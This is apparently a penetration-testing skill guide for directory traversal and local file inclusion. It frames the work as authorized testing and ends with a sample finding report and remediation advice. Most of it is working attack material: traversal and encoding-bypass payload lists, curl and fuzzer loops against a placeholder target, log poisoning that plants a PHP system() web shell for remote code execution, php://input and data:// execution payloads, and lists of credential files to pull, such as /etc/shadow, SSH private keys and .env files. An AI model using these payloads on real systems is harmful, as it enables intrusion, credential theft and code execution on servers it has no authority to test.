---
name: performing-directory-traversal-testing
description: Testing web applications for path traversal vulnerabilities that allow reading or writing arbitrary files on
  the server by manipulating file path parameters.
domain: cybersecurity
subdomain: web-application-security
tags:
- penetration-testing
- directory-traversal
- path-traversal
- lfi
- owasp
- web-security
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
---

# Performing Directory Traversal Testing

## When to Use

- During authorized penetration tests when the application handles file paths in URL parameters or request bodies
- When testing file download, file view, or file include functionality
- For assessing Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities
- When evaluating template engines, logging systems, or report generators that reference files
- During security assessments of APIs that accept file names or paths as parameters

## Prerequisites

- **Authorization**: Written penetration testing agreement for the target
- **Burp Suite Professional**: For intercepting and modifying file path parameters
- **ffuf**: For fuzzing file path parameters with traversal payloads
- **dotdotpwn**: Automated directory traversal fuzzer (`apt install dotdotpwn`)
- **SecLists**: Traversal payload wordlists from Daniel Miessler's collection
- **curl**: For manual testing of traversal payloads

## Critical: Variants Most Often Missed (test these for EVERY file parameter)

Scanners frequently miss path traversal / LFI because they only try the
canonical `../../../etc/passwd` and give up when a filter blocks it. For every
parameter that could reference a file, you MUST try the full matrix below — a
single blocked payload does not mean the parameter is safe.

```text
# 1. Raw absolute path — NO traversal at all. Works when the app prepends
#    nothing or uses include($_GET['x']) directly. THIS IS THE #1 MISS.
/etc/passwd
etc/passwd
file:///etc/passwd

# 2. Leading-slash variants — bypass filters that strip a single "../" or
#    only block the exact string "/etc/passwd". Extra leading slashes are
#    normalized to one by most loaders, so //etc/passwd == /etc/passwd.
//etc/passwd
///etc/passwd
////etc/passwd
/./etc/passwd
/%2e/etc/passwd

# 3. Classic relative traversal at increasing depth (1–12 levels)
../etc/passwd ... ../../../../../../../../../../../../etc/passwd

# 4. Filter-stripping bypasses (non-recursive "../" removal)
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd

# 5. Encoding bypasses
..%2f..%2f..%2fetc%2fpasswd            # single URL-encode
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd    # double URL-encode
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd # overlong UTF-8
%2e%2e/%2e%2e/%2e%2e/etc/passwd

# 6. Trailer / extension-append bypasses
../../../etc/passwd%00.png             # null byte (PHP < 5.3.4)
../../../etc/passwd%00
../../../etc/passwd#
../../../etc/passwd?
/etc/passwd%00.jpg

# 7. Path-parameter / semicolon bypasses (Tomcat, some proxies)
..;/..;/..;/etc/passwd
```

### How to CONFIRM a hit (avoid false negatives)

Match the response body against these signatures, not just a 200 status or a
size change:

- `/etc/passwd`  → regex `root:.*?:0:0:` (a root line). Also `daemon:`, `nobody:`.
- `/etc/hosts`   → `127.0.0.1` plus `localhost`.
- `/proc/self/environ` → `PATH=` / `HTTP_USER_AGENT=`.
- Windows `win.ini` → `[fonts]` / `[extensions]` / `for 16-bit app support`.
- PHP `php://filter` base64 read → a long base64 blob that decodes to `<?php`.

Treat ANY of: a content-length delta vs. a known-bad baseline, a new MIME type,
or a partial match (e.g. only `root:x:0:0` with the rest truncated) as a
candidate worth manual confirmation. Do NOT require the literal full file.

## Workflow

### Step 1: Identify File Path Parameters

Find application endpoints that reference files through parameters.

```bash
# Common file-handling patterns to look for:
# /download?file=report.pdf
# /view?page=about.html
# /api/files?path=documents/invoice.pdf
# /template?name=header.html
# /include?module=sidebar
# /image?src=photos/avatar.jpg
# /export?format=csv&template=default

# In Burp Suite, search proxy history for file-related parameters
# Filter by parameter names: file, path, page, template, include,
# module, src, doc, document, folder, dir, name, filename

# Test with a known valid file to establish baseline
curl -s "https://target.example.com/download?file=report.pdf" -o /dev/null -w "%{http_code} %{size_download}"

# Try referencing a file that shouldn't be accessible
curl -s "https://target.example.com/download?file=../../../etc/passwd"
```

### Step 2: Test Basic Directory Traversal Payloads

Attempt to escape the intended directory and read sensitive files.

```bash
# Linux traversal payloads
PAYLOADS=(
  "../../../etc/passwd"
  "../../../../etc/passwd"
  "../../../../../etc/passwd"
  "../../../../../../etc/passwd"
  "../../../../../../../etc/passwd"
  "..%2f..%2f..%2fetc%2fpasswd"
  "..%252f..%252f..%252fetc%252fpasswd"
  "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
  "....//....//....//etc/passwd"
  "..;/..;/..;/etc/passwd"
)

for payload in "${PAYLOADS[@]}"; do
  echo -n "Testing: $payload -> "
  response=$(curl -s "https://target.example.com/download?file=$payload")
  if echo "$response" | grep -q "root:"; then
    echo "VULNERABLE"
  else
    echo "Blocked"
  fi
done

# Windows traversal payloads
WIN_PAYLOADS=(
  "..\..\..\windows\win.ini"
  "..%5c..%5c..%5cwindows%5cwin.ini"
  "..\/..\/..\/windows/win.ini"
  "....\\....\\....\\windows\\win.ini"
)

for payload in "${WIN_PAYLOADS[@]}"; do
  echo -n "Testing: $payload -> "
  curl -s "https://target.example.com/download?file=$payload" | head -c 100
  echo
done
```

### Step 3: Apply Encoding and Filter Bypass Techniques

Use various encoding schemes to bypass input validation filters.

```bash
# URL encoding bypass
curl -s "https://target.example.com/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Double URL encoding
curl -s "https://target.example.com/download?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"

# UTF-8 encoding
curl -s "https://target.example.com/download?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"

# Null byte injection (PHP < 5.3.4)
curl -s "https://target.example.com/download?file=../../../etc/passwd%00.pdf"

# Path truncation (Windows)
# Exceeding MAX_PATH (260 chars) to bypass extension checks
LONG_PATH="../../../etc/passwd"
for i in $(seq 1 200); do LONG_PATH="${LONG_PATH}/."; done
curl -s "https://target.example.com/download?file=$LONG_PATH"

# Case manipulation (Windows)
curl -s "https://target.example.com/download?file=..\..\..\..\WiNdOwS\win.ini"

# Dot-dot-slash variations
curl -s "https://target.example.com/download?file=....//....//....//etc/passwd"
curl -s "https://target.example.com/download?file=....//../../../etc/passwd"

# Using absolute path (if filter only blocks relative traversal)
curl -s "https://target.example.com/download?file=/etc/passwd"
```

### Step 4: Automate with ffuf and dotdotpwn

Use automated tools for comprehensive traversal testing.

```bash
# ffuf with traversal payload list
ffuf -u "https://target.example.com/download?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mc 200 \
  -fs 0 \
  -t 20 -rate 50 \
  -o traversal-results.json -of json

# dotdotpwn for systematic traversal testing
dotdotpwn -m http-url \
  -u "https://target.example.com/download?file=TRAVERSAL" \
  -k "root:" \
  -o /tmp/dotdotpwn-results.txt \
  -d 8 -t 200

# Burp Intruder approach:
# 1. Send request to Intruder
# 2. Mark the file parameter value as insertion point
# 3. Load LFI payload list from SecLists
# 4. Add Grep Match rules for: "root:", "[extensions]", "for 16-bit"
# 5. Start attack and review matches
```

### Step 5: Test Local File Inclusion (LFI) for Code Execution

If LFI is confirmed, attempt to escalate to remote code execution.

```bash
# PHP LFI to RCE via log poisoning
# Step 1: Inject PHP code into access log
curl -s -A "<?php system(\$_GET['cmd']); ?>" \
  "https://target.example.com/"

# Step 2: Include the log file via LFI
curl -s "https://target.example.com/page?file=../../../var/log/apache2/access.log&cmd=id"

# PHP wrapper for file read (base64 encode to avoid parsing)
curl -s "https://target.example.com/page?file=php://filter/convert.base64-encode/resource=config.php"

# PHP wrapper for code execution
curl -s -X POST \
  -d "<?php system('id'); ?>" \
  "https://target.example.com/page?file=php://input"

# PHP data wrapper
curl -s "https://target.example.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="

# Include /proc/self/environ (if readable)
curl -s -A "<?php phpinfo(); ?>" \
  "https://target.example.com/page?file=../../../proc/self/environ"

# Session file inclusion
# Write PHP code into session via another parameter
# Then include: /tmp/sess_<PHPSESSID>
```

### Step 6: Read High-Value Files

Target sensitive configuration and credential files.

```bash
# Linux high-value files
HIGH_VALUE_LINUX=(
  "/etc/passwd"
  "/etc/shadow"
  "/etc/hosts"
  "/etc/hostname"
  "/proc/self/environ"
  "/proc/self/cmdline"
  "/var/www/html/.env"
  "/var/www/html/config.php"
  "/var/www/html/wp-config.php"
  "/home/user/.ssh/id_rsa"
  "/home/user/.bash_history"
  "/root/.bash_history"
  "/var/log/auth.log"
)

for file in "${HIGH_VALUE_LINUX[@]}"; do
  traversal="../../../../../../..$file"
  echo -n "$file: "
  response=$(curl -s "https://target.example.com/download?file=$traversal")
  if [ ${#response} -gt 10 ]; then
    echo "READABLE (${#response} bytes)"
  else
    echo "Not accessible"
  fi
done

# Windows high-value files
HIGH_VALUE_WIN=(
  "C:\\Windows\\win.ini"
  "C:\\Windows\\System32\\drivers\\etc\\hosts"
  "C:\\inetpub\\wwwroot\\web.config"
  "C:\\Users\\Administrator\\.ssh\\id_rsa"
  "C:\\xampp\\apache\\conf\\httpd.conf"
  "C:\\xampp\\mysql\\data\\mysql\\user.MYD"
)
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Directory Traversal** | Using `../` sequences to navigate to parent directories and access files outside the intended path |
| **Local File Inclusion (LFI)** | Server-side inclusion of local files, potentially leading to code execution |
| **Remote File Inclusion (RFI)** | Including files from external URLs (requires `allow_url_include=On` in PHP) |
| **Null Byte Injection** | Using `%00` to truncate file paths, bypassing extension checks in older PHP versions |
| **PHP Wrappers** | Protocols like `php://filter`, `php://input`, `data://` for reading and executing files |
| **Log Poisoning** | Injecting code into log files and then including them via LFI for code execution |
| **Path Canonicalization** | The process of resolving relative paths to absolute paths, which can be exploited |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite Professional** | Request interception and Intruder for automated payload testing |
| **ffuf** | Fast fuzzing with LFI/traversal wordlists |
| **dotdotpwn** | Dedicated directory traversal fuzzer with multiple traversal patterns |
| **LFISuite** | Automated LFI exploitation tool with multiple techniques |
| **SecLists** | Comprehensive wordlists including LFI payloads and traversal patterns |
| **Kadimus** | LFI scanning and exploitation tool |

## Common Scenarios

### Scenario 1: File Download Traversal
A document download endpoint at `/download?file=report.pdf` does not validate the file parameter. Replacing the value with `../../../etc/passwd` returns the server's password file.

### Scenario 2: Template LFI to RCE
A PHP application includes templates via `?page=home`. By poisoning the Apache access log with PHP code in the User-Agent header, then including the log file, the attacker achieves remote code execution.

### Scenario 3: Image Path Traversal
An image resizing service accepts `?src=images/photo.jpg`. The application strips `../` once but does not recurse, so `....//....//etc/passwd` bypasses the filter.

### Scenario 4: Windows IIS Configuration Leak
A .NET application serves files via `?path=docs\manual.pdf`. Traversing to `..\..\web.config` exposes the IIS configuration file containing database connection strings.

## Output Format

```
## Directory Traversal Finding

**Vulnerability**: Path Traversal / Local File Inclusion
**Severity**: High (CVSS 8.6)
**Location**: GET /download?file=../../../etc/passwd
**OWASP Category**: A01:2021 - Broken Access Control

### Reproduction Steps
1. Navigate to https://target.example.com/download?file=report.pdf
2. Replace file parameter: ?file=../../../etc/passwd
3. Server returns contents of /etc/passwd

### Files Retrieved
| File | Impact |
|------|--------|
| /etc/passwd | User enumeration (42 accounts) |
| /var/www/html/.env | Database credentials exposed |
| /home/deploy/.ssh/id_rsa | SSH private key recovered |
| /proc/self/environ | Environment variables with API keys |

### Filter Bypass Required
Original `../` stripped by filter. Successful bypass: `....//....//....//etc/passwd`

### Recommendation
1. Use an allowlist of permitted file names rather than accepting arbitrary paths
2. Resolve the canonical path and verify it stays within the intended directory
3. Run the web server with minimal file system permissions
4. Remove sensitive files from web-accessible directories
5. Disable PHP wrappers (allow_url_include, allow_url_fopen) if not required
```
